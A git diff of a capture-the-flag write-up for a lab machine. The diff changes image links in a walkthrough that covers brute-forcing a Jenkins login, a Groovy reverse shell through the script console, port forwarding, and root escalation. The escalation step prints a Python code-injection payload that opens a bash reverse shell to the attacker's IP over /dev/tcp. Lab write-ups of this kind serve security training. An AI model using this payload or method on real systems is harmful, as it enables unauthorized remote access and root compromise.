@@ -27,12 +27,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 The nmap scan shows a Jenkins server running on port 30609, navigating to the jenkin server is an administrator login page
 
-![[Pasted image 20240624002503.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev1.png)
 
 Trying default jenkin's credentials didn't work so i had to brute force for credentials.
 
 I used burp suite to capture the login request so i can use it on hydra
-![[Pasted image 20240624003056.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev2.png)
 
 # Exploitation 
 
@@ -45,51 +45,51 @@ since as burp suite captures another get request `loginError` when we submit a w
 
 I was able to log in with the credentials found
 
-![[Pasted image 20240624234618.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev3.png)
 
 
-![[Pasted image 20240624002122.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev4.png)
 
 Navigating to People i found `flag69`
 
-![[Pasted image 20240624010137.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev5.png)
 
 Under `Manage Jenkins` there's a script console that can run arbitrary groovy script on the server, so i generated a groovy reverse sell script and executed it in the script console to gain reverse shell.
 
-![[Pasted image 20240624011333.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev6.png)
 
-![[Pasted image 20240624234537.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev7.png)
 
 > You can also get a reverse shell from jenkins by creating a new project and building it
 
 I then change directory into the home directory of the user i got a shell with and found `flag70`
 
-![[Pasted image 20240624234848.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev8.png)
 
 Checking for the active connections on the system using `netstat -ano` i found a service running locally on port `8080` 
 
-![[Pasted image 20240625000114.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev9.png)
 
 So i transferred chisel to the box so i can forward the port to my attacker machine
 
 After forwarding the port i navigated to `127.0.0.1:8080` and saw this page
 
-![[Pasted image 20240625001356.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev10.png)
 
 Viewing the page source of the page was a link directing to the next flag
 
-![[Pasted image 20240625001757.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev11.png)
 
 Navigating to it i found `flag71`
 
-![[Pasted image 20240625001857.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev12.png)
 
 
 # Privilege Escalation
 
 So doing some future enumeration with `pspy` to see processes running on the target machine i found this process running `/usr/bin/python /root/mycalc/untitled.py 127.0.0.1 8080` as root.
 
-![[Pasted image 20240625011927.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev13.png)
 
 Since i can not read or modify `/root/mycalc/untitled.py 127.0.0.1 8080` doing some research online i found a blog about hacking python applications [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) 
 
@@ -103,13 +103,13 @@ I ran the following payload in the first box of the python application
 __import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.66.x/33006 0>&1"')#
 ```
 
-![[Pasted image 20240625013930.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev14.png)
 
 
 And i got a reverse shell back as root
 
-![[Pasted image 20240625013952.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev15.png)
 
 I was able to navigate into the root folder and get `flag72`
 
-![[Pasted image 20240625014121.png]]
+![image](https://agent-skywalker.github.io/post/ptd/images/juniordev16.png)
